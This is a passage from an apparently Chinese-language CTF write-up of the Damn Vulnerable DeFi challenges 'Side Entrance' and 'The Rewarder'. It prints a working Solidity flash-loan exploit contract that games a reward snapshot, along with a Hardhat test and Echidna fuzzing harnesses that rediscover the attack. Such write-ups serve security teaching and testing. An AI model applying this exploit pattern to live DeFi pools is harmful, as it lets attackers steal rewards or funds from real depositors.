<span class="w">    </span><span class="c1">// IFlashLoanEtherReceiver.execute()</span>
<span class="w">    </span><span class="c1">// some manual work to guide Echidna</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">execute</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">canWithdraw</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">pool</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">canDeposit</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">pool</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">depositAmount</span><span class="p">}();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">flashLoan</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">pool</span><span class="p">.</span><span class="nx">flashLoan</span><span class="p">(</span><span class="nx">_amount</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testBalance</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">assert</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">side-entrance.yml</p>
<div class="highlight"><pre><span></span><code>testMode: assertion # to check sth as well as changing the state
balanceContract: 1000000000000000000000 # 1000 ether

deployer: &quot;0x10000&quot;
psender: &quot;0x10000&quot;
contractAddr: &quot;0x10000&quot; # only the SideEntranceTest contract is the sender
sender: [&quot;0x10000&quot;]
</code></pre></div>
</div>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>echidna<span class="w"> </span>.<span class="w"> </span>--contract<span class="w"> </span>SideEntranceTest<span class="w"> </span>--config<span class="w"> </span>side-entrance.yml<span class="w"> </span>
...
execute<span class="o">()</span>:<span class="w">  </span>passed!<span class="w"> </span>üéâ
flashLoan<span class="o">(</span>uint256<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>üéâ
setDeposit<span class="o">(</span>bool,uint256<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>üéâ
setWithdraw<span class="o">(</span>bool<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>üéâ
testBalance<span class="o">()</span>:<span class="w"> </span>failed!üí•<span class="w">  </span>
<span class="w">  </span>Call<span class="w"> </span>sequence:
<span class="w">    </span>execute<span class="o">()</span><span class="w"> </span>Value:<span class="w"> </span>0x8081
<span class="w">    </span>setDeposit<span class="o">(</span>true,32768<span class="o">)</span>
<span class="w">    </span>flashLoan<span class="o">(</span><span class="m">1</span><span class="o">)</span>
<span class="w">    </span>setDeposit<span class="o">(</span>false,0<span class="o">)</span>
<span class="w">    </span>setWithdraw<span class="o">(</span><span class="nb">true</span><span class="o">)</span>
<span class="w">    </span>execute<span class="o">()</span>
<span class="w">    </span>testBalance<span class="o">()</span>

Event<span class="w"> </span>sequence:<span class="w"> </span>Panic<span class="o">(</span><span class="m">1</span><span class="o">)</span>:<span class="w"> </span>Using<span class="w"> </span>assert.
AssertionFailed<span class="o">(</span>..<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>üéâ
Unique<span class="w"> </span>instructions:<span class="w"> </span><span class="m">1079</span>
Unique<span class="w"> </span>codehashes:<span class="w"> </span><span class="m">2</span>
Corpus<span class="w"> </span>size:<span class="w"> </span><span class="m">9</span>
Seed:<span class="w"> </span><span class="m">4893652944378861842</span>
</code></pre></div>
<h2 id="5-the-rewarder">5. The Rewarder<a class="headerlink" href="#5-the-rewarder" title="Permanent link">&para;</a></h2>
<blockquote>
<p>There‚Äôs a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.</p>
<p>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!</p>
<p>You don‚Äôt have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.</p>
<p>By the way, rumours say a new pool has just launched. Isn‚Äôt it offering flash loans of DVT tokens?</p>
</blockquote>
<ul>
<li>
<p><code>rewardToken</code> ÁöÑÂàÜÂèëÂèñÂÜ≥‰∫éÊúÄÂêé‰∏ÄÊ¨°Âø´ÁÖß</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">distributeRewards</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">rewards</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">isNewRewardsRound</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_recordSnapshot</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">totalDeposits</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">accountingToken</span><span class="p">.</span><span class="nx">totalSupplyAt</span><span class="p">(</span><span class="nx">lastSnapshotIdForRewards</span><span class="p">);</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amountDeposited</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">accountingToken</span><span class="p">.</span><span class="nx">balanceOfAt</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">lastSnapshotIdForRewards</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">amountDeposited</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">totalDeposits</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">rewards</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">amountDeposited</span><span class="p">.</span><span class="nx">mulDiv</span><span class="p">(</span><span class="nx">REWARDS</span><span class="p">,</span><span class="w"> </span><span class="nx">totalDeposits</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">rewards</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">_hasRetrievedReward</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">rewardToken</span><span class="p">.</span><span class="nx">mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">rewards</span><span class="p">);</span>
<span class="w">            </span><span class="nx">lastRewardTimestamps</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>ÊØè <span class="arithmatex">\(5\)</span> Â§©ÂèØ‰ª•Âø´ÁÖß‰∏ÄÊ¨°</p>
<div class="highlight"><pre><span></span><code><span class="nx">uint256</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">REWARDS_ROUND_MIN_DURATION</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5</span><span class="w"> </span><span class="nx">days</span><span class="p">;</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">_recordSnapshot</span><span class="p">()</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">lastSnapshotIdForRewards</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint128</span><span class="p">(</span><span class="nx">accountingToken</span><span class="p">.</span><span class="nx">snapshot</span><span class="p">());</span>
<span class="w">        </span><span class="nx">lastRecordedSnapshotTimestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">);</span>
<span class="w">        </span><span class="nx">unchecked</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="o">++</span><span class="nx">roundNumber</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">isNewRewardsRound</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">lastRecordedSnapshotTimestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">REWARDS_ROUND_MIN_DURATION</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>Áî±‰∫é‰∏çÊ£ÄÊü• <code>deposit/withdraw</code> ÁöÑÊó∂Èó¥ÔºåÂèØÂú® <span class="arithmatex">\(5\)</span> Â§©ÂêéÂÄüÂä©Èó™ÁîµË¥∑ <code>deposit()</code> ÂàõÂª∫Êñ∞ÁöÑÂø´ÁÖßÂπ∂Ëé∑Âæó <code>rewardToken</code>ÔºåÂÜç <code>withdraw()</code> ÂΩíËøòÈó™ÁîµË¥∑</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">amount</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">InvalidDepositAmount</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">accountingToken</span><span class="p">.</span><span class="nx">mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">distributeRewards</span><span class="p">();</span>

<span class="w">    </span><span class="nx">SafeTransferLib</span><span class="p">.</span><span class="nx">safeTransferFrom</span><span class="p">(</span>
<span class="w">        </span><span class="nx">liquidityToken</span><span class="p">,</span>
<span class="w">        </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span>
<span class="w">        </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span>
<span class="w">        </span><span class="nx">amount</span>
<span class="w">    </span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">accountingToken</span><span class="p">.</span><span class="nx">burn</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">SafeTransferLib</span><span class="p">.</span><span class="nx">safeTransfer</span><span class="p">(</span><span class="nx">liquidityToken</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</li>
</ul>
<h3 id="exploit_2">Exploit<a class="headerlink" href="#exploit_2" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./FlashLoanerPool.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./TheRewarderPool.sol&quot;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">TheRewarderHacker</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">TheRewarderPool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">pool</span><span class="p">;</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">dvt</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">TheRewarderPool</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">        </span><span class="nx">dvt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">lender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">FlashLoanerPool</span><span class="p">(</span><span class="nx">lender</span><span class="p">).</span><span class="nx">flashLoan</span><span class="p">(</span><span class="mf">1000000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
<span class="w">        </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">receiveFlashLoan</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">dvt</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">        </span><span class="nx">pool</span><span class="p">.</span><span class="nx">deposit</span><span class="p">(</span><span class="nx">amount</span><span class="p">);</span>
<span class="w">        </span><span class="nx">pool</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">amount</span><span class="p">);</span>
<span class="w">        </span><span class="nx">dvt</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="nx">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">provider</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&quot;evm_increaseTime&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="mf">5</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">24</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="p">]);</span><span class="w"> </span><span class="c1">// 5 days</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">TheRewarderHackerFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="s1">&#39;TheRewarderHacker&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">player</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">theRewarderHacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">TheRewarderHackerFactory</span><span class="p">.</span><span class="nx">deploy</span><span class="p">(</span><span class="nx">rewarderPool</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">liquidityToken</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">theRewarderHacker</span><span class="p">.</span><span class="nx">exploit</span><span class="p">(</span><span class="nx">flashLoanPool</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">rewardToken</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div>
<h3 id="using-echidna_3">Using Echidna<a class="headerlink" href="#using-echidna_3" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>Âõ†‰∏∫ÂêàÁ∫¶ <code>TheRewarderPool</code> Ê∂âÂèäÂà∞ <code>REWARDS_ROUND_MIN_DURATION</code>ÔºåÊâÄ‰ª•Âú®ÊµãËØïÂêàÁ∫¶‰∏≠‰ΩøÁî®‰∫Ü <code>increaseTime()</code>ÔºåÂÖ∂ÂÆÉÂáΩÊï∞ÈÄªËæëÁ±ª‰ºº <a href="#using-echidna-2">4. Side Entrance</a>ÔºåËÉΩÂ§ü Fuzzing Âá∫ÁªìÊûúÔºå‰∏çËøá Hevm ‰∏çÊòØÂøÖÈúÄÁöÑ uwu</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">increaseTime</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">hevm</span><span class="p">.</span><span class="nx">warp</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">5</span><span class="w"> </span><span class="nx">days</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</li>
</ul>
<details class="note">
<summary>contracts/the-rewarder/TheRewarderTest.sol</summary>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./FlashLoanerPool.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./TheRewarderPool.sol&quot;</span><span class="p">;</span>

<span class="kr">interface</span><span class="w"> </span><span class="nx">IHevm</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">warp</span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">prank</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Deployer</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">TOKENS_IN_LENDER_POOl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1000000</span><span class="w"> </span><span class="nx">ether</span><span class="p">;</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">DEPOSIT_AMOUNT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="nx">ether</span><span class="p">;</span>

<span class="w">    </span><span class="nx">FlashLoanerPool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">pool</span><span class="p">;</span>
<span class="w">    </span><span class="nx">TheRewarderPool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">rewarder</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">DamnValuableToken</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">DamnValuableToken</span><span class="p">();</span>
<span class="w">        </span><span class="nx">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">FlashLoanerPool</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">));</span>
<span class="w">        </span><span class="nx">rewarder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">TheRewarderPool</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">));</span>

<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">),</span><span class="w"> </span><span class="nx">TOKENS_IN_LENDER_POOl</span><span class="p">);</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint160</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x20000</span><span class="p">;</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x60000</span><span class="p">;</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">u</span><span class="p">),</span><span class="w"> </span><span class="nx">DEPOSIT_AMOUNT</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">/// @dev run with `echidna . --contract TheRewarderTest --config the-rewarder.yml`</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">TheRewarderTest</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">FlashLoanerPool</span><span class="w"> </span><span class="nx">pool</span><span class="p">;</span>
<span class="w">    </span><span class="nx">TheRewarderPool</span><span class="w"> </span><span class="nx">rewarder</span><span class="p">;</span>

<span class="w">    </span><span class="nx">DamnValuableToken</span><span class="w"> </span><span class="nx">token</span><span class="p">;</span>
<span class="w">    </span><span class="nx">RewardToken</span><span class="w"> </span><span class="nx">rewardToken</span><span class="p">;</span>

<span class="w">    </span><span class="nx">IHevm</span><span class="w"> </span><span class="nx">hevm</span><span class="p">;</span>

<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">REWARDS_ROUND_MIN_DURATION</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5</span><span class="w"> </span><span class="nx">days</span><span class="p">;</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">TOKENS_IN_LENDER_POOl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1000000</span><span class="w"> </span><span class="nx">ether</span><span class="p">;</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">DEPOSIT_AMOUNT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="nx">ether</span><span class="p">;</span>

<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">canDeposit</span><span class="p">;</span>
<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">canWithdraw</span><span class="p">;</span>
<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">canDistribute</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">Deployer</span><span class="w"> </span><span class="nx">deployer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Deployer</span><span class="p">();</span>
<span class="w">        </span><span class="nx">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">FlashLoanerPool</span><span class="p">(</span><span class="nx">deployer</span><span class="p">.</span><span class="nx">pool</span><span class="p">());</span>
<span class="w">        </span><span class="nx">rewarder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">TheRewarderPool</span><span class="p">(</span><span class="nx">deployer</span><span class="p">.</span><span class="nx">rewarder</span><span class="p">());</span>

<span class="w">        </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">DamnValuableToken</span><span class="p">(</span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">liquidityToken</span><span class="p">());</span>
<span class="w">        </span><span class="nx">rewardToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">rewardToken</span><span class="p">();</span>

<span class="w">        </span><span class="nx">hevm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IHevm</span><span class="p">(</span><span class="mh">0x7109709ECfa91a80626fF3989D68f67F5b1DD12D</span><span class="p">);</span><span class="w">   </span><span class="c1">// addr from docs</span>

<span class="w">        </span><span class="c1">// users deposit</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint160</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x20000</span><span class="p">;</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x60000</span><span class="p">;</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">hevm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">u</span><span class="p">));</span>
<span class="w">            </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">rewarder</span><span class="p">),</span><span class="w"> </span><span class="nx">DEPOSIT_AMOUNT</span><span class="p">);</span>
<span class="w">            </span><span class="nx">hevm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">u</span><span class="p">));</span>
<span class="w">            </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">deposit</span><span class="p">(</span><span class="nx">DEPOSIT_AMOUNT</span><span class="p">);</span>
